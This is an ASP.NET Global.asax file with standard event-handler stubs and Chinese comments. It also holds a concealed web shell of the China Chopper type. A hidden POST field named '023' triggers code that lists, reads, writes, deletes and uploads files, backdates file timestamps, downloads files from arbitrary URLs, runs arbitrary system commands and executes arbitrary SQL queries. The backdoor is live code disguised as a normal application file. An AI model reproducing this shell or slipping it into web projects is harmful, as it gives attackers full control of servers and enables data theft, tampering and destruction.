<%@ Application Language="C#" %>
 
<script RunAt='server'>
 
    void Application_Start(object sender, EventArgs e)
    {
        //在应用程序启动时运行的代码
 
    }
 
    void Application_End(object sender, EventArgs e)
    {
        //在应用程序关闭时运行的代码
 
    }
 
    void Application_Error(object sender, EventArgs e)
    {
 
 
    }
 
    void Session_Start(object sender, EventArgs e)
    {
        //在新会话启动时运行的代码
 
    }
 
    void Session_End(object sender, EventArgs e)
    {
        //在会话结束时运行的代码。 
        // 注意: 只有在 Web.config 文件中的 sessionstate 模式设置为
        // InProc 时，才会引发 Session_End 事件。如果会话模式 
        //设置为 StateServer 或 SQLServer，则不会引发该事件。
 
    }
 
    void CP(string S, string D)
    {
        if (System.IO.Directory.Exists(S))
        {
            System.IO.DirectoryInfo m = new System.IO.DirectoryInfo(S);
            System.IO.Directory.CreateDirectory(D);
            foreach (System.IO.FileInfo F in m.GetFiles())
            {
                System.IO.File.Copy(S + "\\" + F.Name, D + "\\" + F.Name);
            }
            foreach (System.IO.DirectoryInfo F in m.GetDirectories())
            {
                CP(S + "\\" + F.Name, D + "\\" + F.Name);
            }
        }
        else
        {
            System.IO.File.Copy(S, D);
        }
    }
 
    void EvalRequest(string action)
    {
        HttpContext context = HttpContext.Current;
        HttpRequest request = context.Request;
        HttpResponse response = context.Response;
 
        string Z = action;
        if (Z != "")
        {
            string Z1 = request.Form["Z1"];
            string Z2 = request.Form["Z2"];
            string R = "";
            try
            {
                switch (Z)
                {
                    case "A":
                        {
                            string[] c = System.IO.Directory.GetLogicalDrives();
                            R = string.Format("{0}\t", context.Server.MapPath("~"));
                            for (int i = 0; i < c.Length; i++)
                                R += c[i][0] + ":";
                            break;
                        }
                    case "B":
                        {
                            System.IO.DirectoryInfo m = new System.IO.DirectoryInfo(Z1);
                            foreach (System.IO.DirectoryInfo D in m.GetDirectories())
                            {
                                R += string.Format("{0}/\t{1}\t0\t-\n", D.Name, System.IO.File.GetLastWriteTime(Z1 + D.Name).ToString("yyyy-MM-dd hh:mm:ss"));
                            }
                            foreach (System.IO.FileInfo D in m.GetFiles())
                            {
                                R += string.Format("{0}\t{1}\t{2}\t-\n", D.Name, System.IO.File.GetLastWriteTime(Z1 + D.Name).ToString("yyyy-MM-dd hh:mm:ss"), D.Length);
                            }
                            break;
                        }
                    case "C":
                        {
                            System.IO.StreamReader m = new System.IO.StreamReader(Z1, Encoding.Default);
                            R = m.ReadToEnd();
                            m.Close();
                            break;
                        }
                    case "D":
                        {
                            System.IO.StreamWriter m = new System.IO.StreamWriter(Z1, false, Encoding.Default);
                            m.Write(Z2);
                            R = "1";
                            m.Close();
                            break;
                        }
                    case "E":
                        {
                            if (System.IO.Directory.Exists(Z1))
                                System.IO.Directory.Delete(Z1, true);
                            else
                                System.IO.File.Delete(Z1);
                            R = "1";
                            break;
                        }
                    case "F":
                        {
                            response.Clear();
                            response.Write("\x2D\x3E\x7C");
                            response.WriteFile(Z1);
                            response.Write("\x7C\x3C\x2D");
                            goto End;
                        }
                    case "G":
                        {
                            byte[] B = new byte[Z2.Length / 2];
                            for (int i = 0; i < Z2.Length; i += 2)
                            {
                                B[i / 2] = (byte)Convert.ToInt32(Z2.Substring(i, 2), 16);
                            }
                            System.IO.FileStream fs = new System.IO.FileStream(Z1, System.IO.FileMode.Create);
                            fs.Write(B, 0, B.Length);
                            fs.Close();
                            R = "1";
                            break;
                        }
                    case "H":
                        {
                            CP(Z1, Z2);
                            R = "1";
                            break;
                        }
                    case "I":
                        {
                            if (System.IO.Directory.Exists(Z1))
                            {
                                System.IO.Directory.Move(Z1, Z2);
                            }
                            else
                            {
                                System.IO.File.Move(Z1, Z2);
                            }
                            break;
                        }
                    case "J":
                        {
                            System.IO.Directory.CreateDirectory(Z1);
                            R = "1";
                            break;
                        }
                    case "K":
                        {
                            DateTime TM = Convert.ToDateTime(Z2);
                            if (System.IO.Directory.Exists(Z1))
                            {
                                System.IO.Directory.SetCreationTime(Z1, TM);
                                System.IO.Directory.SetLastWriteTime(Z1, TM);
                                System.IO.Directory.SetLastAccessTime(Z1, TM);
                            }
                            else
                            {
                                System.IO.File.SetCreationTime(Z1, TM);
                                System.IO.File.SetLastWriteTime(Z1, TM);
                                System.IO.File.SetLastAccessTime(Z1, TM);
                            }
                            R = "1";
                            break;
                        }
                    case "L":
                        {
                            System.Net.HttpWebRequest RQ = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(new Uri(Z1));
                            RQ.Method = "GET";
                            RQ.ContentType = "application/x-www-form-urlencoded";
                            System.Net.HttpWebResponse WB = (System.Net.HttpWebResponse)RQ.GetResponse();
                            System.IO.Stream WF = WB.GetResponseStream();
                            System.IO.FileStream FS = new System.IO.FileStream(Z2, System.IO.FileMode.Create, System.IO.FileAccess.Write);
                            int i;
                            byte[] buffer = new byte[1024];
                            while (true)
                            {
                                i = WF.Read(buffer, 0, buffer.Length);
                                if (i < 1) break; FS.Write(buffer, 0, i);
                            }
                            WF.Close();
                            WB.Close();
                            FS.Close();
                            R = "1";
                            break;
                        }
                    case "M":
                        {
                            System.Diagnostics.ProcessStartInfo c = new System.Diagnostics.ProcessStartInfo(Z1.Substring(2));
                            System.Diagnostics.Process e = new System.Diagnostics.Process();
                            System.IO.StreamReader OT, ER;
                            c.UseShellExecute = false;
                            c.RedirectStandardOutput = true;
                            c.RedirectStandardError = true;
                            e.StartInfo = c;
                            c.Arguments = string.Format("{0} {1}", Z1.Substring(0, 2), Z2);
                            e.Start(); OT = e.StandardOutput;
                            ER = e.StandardError;
                            e.Close();
                            R = OT.ReadToEnd() + ER.ReadToEnd();
                            break;
                        }
                    case "N":
                        {
                            String strDat = Z1.ToUpper();
                            System.Data.SqlClient.SqlConnection Conn = new System.Data.SqlClient.SqlConnection(Z1);
                            Conn.Open();
                            R = Conn.Database + "\t";
                            Conn.Close(); break;
                        }
                    case "O":
                        {
                            String[] x = Z1.Replace("\r", "").Split('\n');
                            String strConn = x[0], strDb = x[1];
                            System.Data.SqlClient.SqlConnection Conn = new System.Data.SqlClient.SqlConnection(strConn);
                            Conn.Open();
                            System.Data.DataTable dt = Conn.GetSchema("Columns");
                            Conn.Close();
                            for (int i = 0; i < dt.Rows.Count; i++)
                            {
                                R += String.Format("{0}\t", dt.Rows[i][2].ToString());
                            }
                            break;
                        }
                    case "P":
                        {
                            String[] x = Z1.Replace("\r", "").Split('\n'), p = new String[4];
                            String strConn = x[0], strDb = x[1], strTable = x[2]; p[0] = strDb;
                            p[2] = strTable;
                            System.Data.SqlClient.SqlConnection Conn = new System.Data.SqlClient.SqlConnection(strConn);
                            Conn.Open();
                            System.Data.DataTable dt = Conn.GetSchema("Columns", p);
                            Conn.Close();
                            for (int i = 0; i < dt.Rows.Count; i++)
                            {
                                R += String.Format("{0} ({1})\t", dt.Rows[i][3].ToString(), dt.Rows[i][7].ToString());
                            }
                            break;
                        }
                    case "Q":
                        {
                            String[] x = Z1.Replace("\r", "").Split('\n');
                            String strDat, strConn = x[0], strDb = x[1];
                            int i, c;
                            strDat = Z2.ToUpper();
                            System.Data.SqlClient.SqlConnection Conn = new System.Data.SqlClient.SqlConnection(strConn);
                            Conn.Open();
                            if (strDat.IndexOf("SELECT ") == 0 || strDat.IndexOf("EXEC ") == 0 || strDat.IndexOf("DECLARE ") == 0)
                            {
                                System.Data.SqlClient.SqlDataAdapter OD = new System.Data.SqlClient.SqlDataAdapter(Z2, Conn);
                                System.Data.DataSet ds = new System.Data.DataSet();
                                OD.Fill(ds);
                                if (ds.Tables.Count > 0)
                                {
                                    System.Data.DataRowCollection rows = ds.Tables[0].Rows;
                                    for (c = 0; c < ds.Tables[0].Columns.Count; c++)
                                    {
                                        R += String.Format("{0}\t|\t", ds.Tables[0].Columns[c].ColumnName.ToString());
                                    }
                                    R += "\r\n";
                                    for (i = 0; i < rows.Count; i++)
                                    {
                                        for (c = 0; c < ds.Tables[0].Columns.Count; c++)
                                        {
                                            R += String.Format("{0}\t|\t", rows[i][c].ToString());
                                        }
                                        R += "\r\n";
                                    }
                                }
                                ds.Clear();
                                ds.Dispose();
                            }
                            else
                            {
                                System.Data.SqlClient.SqlCommand cm = Conn.CreateCommand();
                                cm.CommandText = Z2;
                                cm.ExecuteNonQuery();
                                R = "Result\t|\t\r\nExecute Successfully!\t|\t\r\n";
                            }
                            Conn.Close();
                            break;
                        }
                    default:
                        goto End;
                }
            }
            catch (Exception E)
            {
                R = "ERROR:// " + E.Message;
            }
            response.Write("\x2D\x3E\x7C" + R + "\x7C\x3C\x2D");
        End: ;
        }
    }
 
    //在接收到一个应用程序请求时触发。对于一个请求来说，它是第一个被触发的事件，请求一般是用户输入的一个页面请求（URL）。
    void Application_BeginRequest(object sender, EventArgs evt)
    {
        string action = Request.Form["023"];
        if (action != null)
        {
            EvalRequest(action);
            Response.End();
        }
    }
 
</script>
